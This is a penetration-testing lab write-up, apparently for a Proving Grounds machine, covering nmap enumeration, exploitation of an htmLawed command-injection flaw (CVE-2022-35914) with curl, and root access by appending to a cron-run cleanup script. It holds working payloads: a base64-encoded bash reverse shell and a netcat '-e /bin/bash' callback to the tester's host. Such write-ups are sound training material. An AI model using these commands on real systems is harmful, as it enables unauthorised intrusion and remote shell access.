# nmap
```
┌──(kali㉿kali)-[~/PG/law]
└─$ nmap -p- --min-rate 10000 192.168.152.190
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 23:06 EST
Nmap scan report for 192.168.152.190
Host is up (0.084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.56 seconds
                                                                                                                                           
┌──(kali㉿kali)-[~/PG/law]
└─$ nmap -p 22,80 -sCV 192.168.152.190       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 23:06 EST
Nmap scan report for 192.168.152.190
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: htmLawed (1.2.5) test
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
```
![Pasted image 20250223120652](<0. Attachments/Pasted image 20250223120652.png>)

# web enum
![Pasted image 20250223120808](<0. Attachments/Pasted image 20250223120808.png>)

![Pasted image 20250223120951](<0. Attachments/Pasted image 20250223120951.png>)

# exploit
https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/POC_2022-35914.sh
![Pasted image 20250223121609](<0. Attachments/Pasted image 20250223121609.png>)

what i tried
```
curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://192.168.152.190/ |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
```

![Pasted image 20250223121647](<0. Attachments/Pasted image 20250223121647.png>)

# initial access
to get access we first base64 encode our reverse shell one liner
```
echo "sh -i >& /dev/tcp/192.168.45.203/4444 0>&1" | base64
```
![Pasted image 20250223122145](<0. Attachments/Pasted image 20250223122145.png>)

then using the exploit
```
curl -s -d 'sid=foo&hhook=exec&text=echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMDMvNDQ0NCAwPiYxCg== | base64 -d | bash' -b 'sid=foo' http://192.168.152.190/ |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
```
![Pasted image 20250223122240](<0. Attachments/Pasted image 20250223122240.png>)

on our listener
![Pasted image 20250223122257](<0. Attachments/Pasted image 20250223122257.png>)

# local.txt
![Pasted image 20250223124441](<0. Attachments/Pasted image 20250223124441.png>)
# priv esc enum
![Pasted image 20250223124615](<0. Attachments/Pasted image 20250223124615.png>)

what is cleanup.sh
![Pasted image 20250223124640](<0. Attachments/Pasted image 20250223124640.png>)

![Pasted image 20250223125024](<0. Attachments/Pasted image 20250223125024.png>)

![Pasted image 20250223124917](<0. Attachments/Pasted image 20250223124917.png>)

# priv esc
```
echo 'nc 192.168.45.203 8001 -e /bin/bash' >> cleanup.sh
```

![Pasted image 20250223132233](<0. Attachments/Pasted image 20250223132233.png>)

after a while
![Pasted image 20250223132248](<0. Attachments/Pasted image 20250223132248.png>)

# proof.txt
![Pasted image 20250223132337](<0. Attachments/Pasted image 20250223132337.png>)

